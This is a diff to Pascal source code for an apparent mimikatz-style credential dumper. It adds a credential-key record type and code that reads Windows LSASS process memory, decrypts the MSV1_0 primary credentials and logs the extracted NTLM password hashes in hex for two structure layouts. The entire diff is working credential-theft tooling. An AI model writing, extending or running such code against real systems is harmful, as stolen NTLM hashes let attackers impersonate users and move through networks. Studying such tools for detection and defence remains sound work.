@@ -12,6 +12,11 @@ end;
 
   //session_entry to creds_entry to cred_hash_entry to ntlm_creds_block
 
+  type _credentialkeys=record
+       unk1:array[0..55] of byte;
+       ntlmhash:array[0..15] of byte;
+       end;
+    Pcredentialkeys=^_credentialkeys;
   type _CRED_NTLM_BLOCK=record
        domainlen1:word;
        domainlen2:word;
@@ -858,7 +863,14 @@ begin
                                        ReadMem  (hprocess,nativeuint(PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Buffer),password );
                                        setlength(decrypted,1024);
                                        if decryptLSA (PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length,password,decrypted)=false
-                                                     then log('decryptLSA NOT OK');
+                                                     then log('decryptLSA NOT OK')
+                                                     else
+                                                       begin
+                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=7
+                                                          then log(ByteToHexaString(PCRED_NTLM_BLOCK(@decrypted[0]).ntlmhash) ,1);
+                                                       if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).len=14
+                                                          then log(ByteToHexaString(Pcredentialkeys(@decrypted[0]).ntlmhash) ,1);
+                                                       end;
                                        end;//if PKIWI_MSV1_0_PRIMARY_CREDENTIALS(@bytes[0]).Credentials.Length>0 then
                                      if credentials=0 then break;
                                      ReadMem  (hprocess,credentials,bytes );
